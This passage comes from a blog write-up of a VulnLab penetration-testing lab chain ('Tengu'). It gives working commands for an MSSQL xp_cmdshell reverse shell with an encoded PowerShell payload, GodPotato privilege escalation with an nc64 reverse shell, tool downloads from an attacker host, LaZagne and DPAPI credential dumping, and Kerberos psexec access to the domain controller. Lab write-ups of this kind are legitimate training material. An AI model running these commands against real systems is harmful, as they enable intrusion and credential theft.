+<p><strong>Key Finding:</strong> <code>SeImpersonatePrivilege</code> is enabled, allowing us to perform privilege escalation attacks.</p>
+<hr>
+<h2 id="Establishing-Reverse-Shell-via-MSSQL"><a href="#Establishing-Reverse-Shell-via-MSSQL" class="headerlink" title="Establishing Reverse Shell via MSSQL"></a>Establishing Reverse Shell via MSSQL</h2><h3 id="Configuring-Ligolo-Listener"><a href="#Configuring-Ligolo-Listener" class="headerlink" title="Configuring Ligolo Listener"></a>Configuring Ligolo Listener</h3><p>Since the SQL server cannot reach our attack machine directly, we configured a Ligolo listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listener_add --addr 0.0.0.0:4040 --to 10.8.5.195:4040 --tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="Generating-Payload"><a href="#Generating-Payload" class="headerlink" title="Generating Payload"></a>Generating Payload</h3><p>Generate a base64-encoded PowerShell reverse shell pointing to the jumpbox (use <a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a>):</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell  &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMgAzADUALgAyADEANQAiACwANAAwADQAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAG......&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><h3 id="Exploiting-SeImpersonatePrivilege"><a href="#Exploiting-SeImpersonatePrivilege" class="headerlink" title="Exploiting SeImpersonatePrivilege"></a>Exploiting SeImpersonatePrivilege</h3><p>Download GodPotato from <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato/releases/tag/V1.20">https://github.com/BeichenDream/GodPotato/releases/tag/V1.20</a></p>
+<h3 id="Setting-Up-File-Transfer"><a href="#Setting-Up-File-Transfer" class="headerlink" title="Setting Up File Transfer"></a>Setting Up File Transfer</h3><p>Configure another Ligolo listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listener_add --addr 0.0.0.0:9091 --to 10.8.5.195:9091 --tcp</span><br></pre></td></tr></table></figure>
+
+<p>Start a Python HTTP server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9091</span><br></pre></td></tr></table></figure>
+
+<h3 id="Transferring-Tools"><a href="#Transferring-Tools" class="headerlink" title="Transferring Tools"></a>Transferring Tools</h3><p>From the SQL server:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span> http://<span class="number">10.10</span>.<span class="number">235.215</span>:<span class="number">9091</span>/GodPotato<span class="literal">-NET4</span>.exe <span class="literal">-O</span> GodPotato<span class="literal">-NET4</span>.exe</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">10.10</span>.<span class="number">235.215</span>:<span class="number">9091</span>/nc64.exe <span class="literal">-O</span> nc64.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Executing-Privilege-Escalation"><a href="#Executing-Privilege-Escalation" class="headerlink" title="Executing Privilege Escalation"></a>Executing Privilege Escalation</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\GodPotato<span class="literal">-NET4</span>.exe <span class="literal">-cmd</span> <span class="string">&quot;C:\temp\nc64.exe 10.10.235.215 9091 -e cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Success!</strong> We obtained a SYSTEM shell:</p>
+<p><img src="/images/Tengu/system.png" alt="SYSTEM Shell"></p>
+<hr>
+<h2 id="Post-Exploitation-Discovery"><a href="#Post-Exploitation-Discovery" class="headerlink" title="Post-Exploitation Discovery"></a>Post-Exploitation Discovery</h2><h3 id="Scheduled-Task-Analysis"><a href="#Scheduled-Task-Analysis" class="headerlink" title="Scheduled Task Analysis"></a>Scheduled Task Analysis</h3><p>While enumerating the system, we discovered an interesting PowerShell script in an admin folder:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\admin&gt;<span class="built_in">type</span> Task.ps1</span><br><span class="line"><span class="built_in">type</span> Task.ps1</span><br><span class="line"><span class="comment"># Define the SQL Server service name</span></span><br><span class="line"><span class="variable">$serviceName</span> = <span class="string">&quot;MSSQLSERVER&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check the status of the SQL Server service</span></span><br><span class="line"><span class="variable">$serviceStatus</span> = <span class="built_in">Get-Service</span> <span class="literal">-Name</span> <span class="variable">$serviceName</span> | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Status</span><br><span class="line"></span><br><span class="line"><span class="comment"># If the service is not running, attempt to start it</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$serviceStatus</span> <span class="operator">-ne</span> <span class="string">&quot;Running&quot;</span>) &#123;</span><br><span class="line">    <span class="comment"># Trying to start the service</span></span><br><span class="line">    <span class="built_in">Start-Service</span> <span class="literal">-Name</span> <span class="variable">$serviceName</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Wait for a few seconds to allow the service to start</span></span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check the service status again</span></span><br><span class="line">    <span class="variable">$serviceStatusAfterAttempt</span> = <span class="built_in">Get-Service</span> <span class="literal">-Name</span> <span class="variable">$serviceName</span> | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Status</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Log the current status to a file for auditing purposes</span></span><br><span class="line">    <span class="variable">$logPath</span> = <span class="string">&quot;C:\logs\sql_log.txt&quot;</span></span><br><span class="line">    <span class="variable">$timestamp</span> = <span class="built_in">Get-Date</span> <span class="literal">-Format</span> <span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span></span><br><span class="line">    <span class="variable">$logEntry</span> = <span class="string">&quot;<span class="variable">$timestamp</span> - SQL Server service status: <span class="variable">$serviceStatusAfterAfterAttempt</span>&quot;</span></span><br><span class="line">    <span class="built_in">Add-Content</span> <span class="literal">-Path</span> <span class="variable">$logPath</span> <span class="literal">-Value</span> <span class="variable">$logEntry</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Optional: Send notification if the service is still not running</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$serviceStatusAfterAttempt</span> <span class="operator">-ne</span> <span class="string">&quot;Running&quot;</span>) &#123;</span><br><span class="line">        <span class="comment"># Implement notification logic here (e.g., email notification)</span></span><br><span class="line">        <span class="comment"># This is placeholder for where you would add your notification code</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># If the service is running, optionally log this status</span></span><br><span class="line">    <span class="variable">$logPath</span> = <span class="string">&quot;C:\logs\log.txt&quot;</span></span><br><span class="line">    <span class="variable">$timestamp</span> = <span class="built_in">Get-Date</span> <span class="literal">-Format</span> <span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span></span><br><span class="line">    <span class="variable">$logEntry</span> = <span class="string">&quot;<span class="variable">$timestamp</span> - SQL Server service is already running.&quot;</span></span><br><span class="line">    <span class="built_in">Add-Content</span> <span class="literal">-Path</span> <span class="variable">$logPath</span> <span class="literal">-Value</span> <span class="variable">$logEntry</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This script is likely executed by a scheduled task, potentially with higher privileges.</p>
+<hr>
+<h2 id="Credential-Harvesting"><a href="#Credential-Harvesting" class="headerlink" title="Credential Harvesting"></a>Credential Harvesting</h2><h3 id="Using-LaZagne"><a href="#Using-LaZagne" class="headerlink" title="Using LaZagne"></a>Using LaZagne</h3><p>We uploaded and executed LaZagne to extract stored credentials:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./LaZagne.exe all</span><br></pre></td></tr></table></figure>
+
+<p><strong>Results:</strong></p>
+<ul>
+<li>Retrieved the local Administrator password</li>
+<li>Discovered a DPAPI-encrypted password that LaZagne couldn’t decrypt:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[-] Password not found !!!</span><br><span class="line">URL: Domain:batch=TaskScheduler:Task:&#123;3C0BC8C6-D88D-450C-803D-6A412D858CF2&#125;</span><br><span class="line">Login: TENGU\T0_c.fowler</span><br></pre></td></tr></table></figure>
+
+<h3 id="DPAPI-Decryption"><a href="#DPAPI-Decryption" class="headerlink" title="DPAPI Decryption"></a>DPAPI Decryption</h3><p>Using NetExec with local admin credentials to decrypt DPAPI blobs:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb sql.tengu.vl -u Administrator -H 73db3fdd&lt;HASH&gt;aac7e17e4aba4c --local-auth --dpapi</span><br></pre></td></tr></table></figure>
+
+<p><strong>Decrypted Credential:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:&#123;3C0BC8C6-D88D-450C-803D-6A412D858CF2&#125; - TENGU\T0_c.fowler:&lt;PASS&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Tengu/HASH-DPAPI.png" alt="DPAPI Decryption"></p>
+<hr>
+<h2 id="Domain-Controller-Compromise"><a href="#Domain-Controller-Compromise" class="headerlink" title="Domain Controller Compromise"></a>Domain Controller Compromise</h2><h3 id="Initial-Authentication-Attempt"><a href="#Initial-Authentication-Attempt" class="headerlink" title="Initial Authentication Attempt"></a>Initial Authentication Attempt</h3><p>Attempting to authenticate with the discovered credentials:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py tengu.vl/T0_c.fowler:<span class="string">&#x27;&lt;PASS&gt;&#x27;</span>@dc.tengu.vl</span><br></pre></td></tr></table></figure>
+
+<p><strong>Error:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-] SMB SessionError: code: 0xc000006e - STATUS_ACCOUNT_RESTRICTION - Indicates a referenced user name and authentication information are valid, but some user account restriction has prevented successful authentication (such as time-of-day restrictions).</span><br></pre></td></tr></table></figure>
+
+<p>This error indicates account restrictions, likely due to the Protected Users group membership or time-based logon restrictions.</p>
+<h3 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h3><p>Since NTLM authentication failed, we used Kerberos:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getTGT.py T0_c.fowler@tengu.vl -k -no-pass</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=T0_c.fowler@DC.tengu.vl.ccache</span><br><span class="line">psexec.py T0_c.fowler@dc.tengu.vl -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><strong>Success!</strong> We achieved SYSTEM access on the Domain Controller, completing the chain.</p>
+<hr>
+<p>Full chain documentation: <a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=c0f93c16-1bdc-40a6-8269-0cfdbffe6f63">VulnLab Share Link</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tengu-VulnLab-Chain-Complete-Pentesting-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Tengu VulnLab Chain - Complete Pentesting Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Network-Mapping"><span class="toc-number">1.1.1.</span> <span class="toc-text">Network Mapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Domain-Controller"><span class="toc-number">1.1.2.</span> <span class="toc-text">Nmap Scan - Domain Controller</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-SQL-Server"><span class="toc-number">1.1.3.</span> <span class="toc-text">Nmap Scan - SQL Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Linux-Host"><span class="toc-number">1.1.4.</span> <span class="toc-text">Nmap Scan - Linux Host</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-Node-RED-Exploitation"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Access - Node-RED Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Service-Discovery"><span class="toc-number">1.2.1.</span> <span class="toc-text">Service Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-number">1.2.2.</span> <span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.2.3.</span> <span class="toc-text">Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation-Linux-Host"><span class="toc-number">1.3.</span> <span class="toc-text">Post-Exploitation - Linux Host</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Joined-System-Discovery"><span class="toc-number">1.3.1.</span> <span class="toc-text">Domain-Joined System Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Discovery"><span class="toc-number">1.3.2.</span> <span class="toc-text">Credential Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Decryption"><span class="toc-number">1.3.3.</span> <span class="toc-text">Credential Decryption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pivoting-with-Ligolo-ng"><span class="toc-number">1.4.</span> <span class="toc-text">Pivoting with Ligolo-ng</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-Ligolo-ng"><span class="toc-number">1.4.1.</span> <span class="toc-text">Setting Up Ligolo-ng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Important-Routing-Consideration"><span class="toc-number">1.4.2.</span> <span class="toc-text">Important Routing Consideration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-Specific-Routes"><span class="toc-number">1.4.3.</span> <span class="toc-text">Configuring Specific Routes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Internal-Reconnaissance"><span class="toc-number">1.5.</span> <span class="toc-text">Internal Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Rescan-SQL-Server-via-Ligolo"><span class="toc-number">1.5.1.</span> <span class="toc-text">Nmap Rescan - SQL Server (via Ligolo)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Rescan-Domain-Controller-via-Ligolo"><span class="toc-number">1.5.2.</span> <span class="toc-text">Nmap Rescan - Domain Controller (via Ligolo)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-Access-and-Database-Enumeration"><span class="toc-number">1.6.</span> <span class="toc-text">MSSQL Access and Database Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-MSSQL"><span class="toc-number">1.6.1.</span> <span class="toc-text">Connecting to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Enumeration"><span class="toc-number">1.6.2.</span> <span class="toc-text">Database Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-User-Credentials"><span class="toc-number">1.6.3.</span> <span class="toc-text">Extracting User Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Cracking"><span class="toc-number">1.6.4.</span> <span class="toc-text">Password Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.7.</span> <span class="toc-text">Active Directory Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Collection"><span class="toc-number">1.7.1.</span> <span class="toc-text">BloodHound Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Key-Findings-from-BloodHound"><span class="toc-number">1.7.2.</span> <span class="toc-text">Key Findings from BloodHound</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-Keytab-Extraction"><span class="toc-number">1.8.</span> <span class="toc-text">Kerberos Keytab Extraction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-the-Keytab"><span class="toc-number">1.8.1.</span> <span class="toc-text">Extracting the Keytab</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gMSA-Password-Extraction"><span class="toc-number">1.9.</span> <span class="toc-text">gMSA Password Extraction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-gMSA-Credentials"><span class="toc-number">1.9.1.</span> <span class="toc-text">Dumping gMSA Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Understanding-the-Attack-Path"><span class="toc-number">1.9.2.</span> <span class="toc-text">Understanding the Attack Path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Protected-Users-Group-Consideration"><span class="toc-number">1.9.3.</span> <span class="toc-text">Protected Users Group Consideration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-Delegation-Attack"><span class="toc-number">1.10.</span> <span class="toc-text">Kerberos Delegation Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Obtaining-Service-Ticket"><span class="toc-number">1.10.1.</span> <span class="toc-text">Obtaining Service Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authenticating-to-MSSQL"><span class="toc-number">1.10.2.</span> <span class="toc-text">Authenticating to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enabling-xp-cmdshell"><span class="toc-number">1.10.3.</span> <span class="toc-text">Enabling xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Privileges"><span class="toc-number">1.10.4.</span> <span class="toc-text">Checking Privileges</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Establishing-Reverse-Shell-via-MSSQL"><span class="toc-number">1.11.</span> <span class="toc-text">Establishing Reverse Shell via MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-Ligolo-Listener"><span class="toc-number">1.11.1.</span> <span class="toc-text">Configuring Ligolo Listener</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generating-Payload"><span class="toc-number">1.11.2.</span> <span class="toc-text">Generating Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.12.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-SeImpersonatePrivilege"><span class="toc-number">1.12.1.</span> <span class="toc-text">Exploiting SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-File-Transfer"><span class="toc-number">1.12.2.</span> <span class="toc-text">Setting Up File Transfer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Transferring-Tools"><span class="toc-number">1.12.3.</span> <span class="toc-text">Transferring Tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Executing-Privilege-Escalation"><span class="toc-number">1.12.4.</span> <span class="toc-text">Executing Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation-Discovery"><span class="toc-number">1.13.</span> <span class="toc-text">Post-Exploitation Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Scheduled-Task-Analysis"><span class="toc-number">1.13.1.</span> <span class="toc-text">Scheduled Task Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Harvesting"><span class="toc-number">1.14.</span> <span class="toc-text">Credential Harvesting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-LaZagne"><span class="toc-number">1.14.1.</span> <span class="toc-text">Using LaZagne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DPAPI-Decryption"><span class="toc-number">1.14.2.</span> <span class="toc-text">DPAPI Decryption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Controller-Compromise"><span class="toc-number">1.15.</span> <span class="toc-text">Domain Controller Compromise</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Authentication-Attempt"><span class="toc-number">1.15.1.</span> <span class="toc-text">Initial Authentication Attempt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-Authentication"><span class="toc-number">1.15.2.</span> <span class="toc-text">Kerberos Authentication</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/11/VL-Tengu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&text=VL-Tengu"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&is_video=false&description=VL-Tengu"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Tengu&body=Check out this article: https://panosoikogr.github.io/2025/11/11/VL-Tengu/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&name=VL-Tengu&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&t=VL-Tengu"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
